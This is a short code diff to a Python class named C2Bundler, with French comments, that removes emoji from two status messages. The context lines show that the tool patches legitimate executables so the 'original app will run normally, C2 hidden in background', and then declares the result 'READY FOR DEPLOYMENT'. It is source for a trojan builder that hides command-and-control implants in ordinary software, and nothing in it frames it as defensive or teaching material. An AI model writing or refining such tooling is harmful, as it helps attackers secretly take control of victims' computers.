@@ -149,7 +149,7 @@ class C2Bundler:
 
             # Vérifier que c'est un vrai exécutable
             if exe_path.stat().st_mode & 0o111:
-                print(f"[+] Status: ✅ READY FOR DEPLOYMENT")
+                print(f"[+] Status: READY FOR DEPLOYMENT")
                 return True
             else:
                 print(f"[!] Not executable (permissions)")
@@ -240,7 +240,7 @@ class C2Bundler:
                 print(f"[+] Patched executable: {dest}")
                 print(f"[+] Size: {size_mb:.2f} MB")
                 print(f"[+] Original app will run normally, C2 hidden in background!")
-                print(f"[+] Status: ✅ READY FOR DEPLOYMENT")
+                print(f"[+] Status: READY FOR DEPLOYMENT")
                 return True
             else:
                 print(f"[!] Executable not found at: {source}")
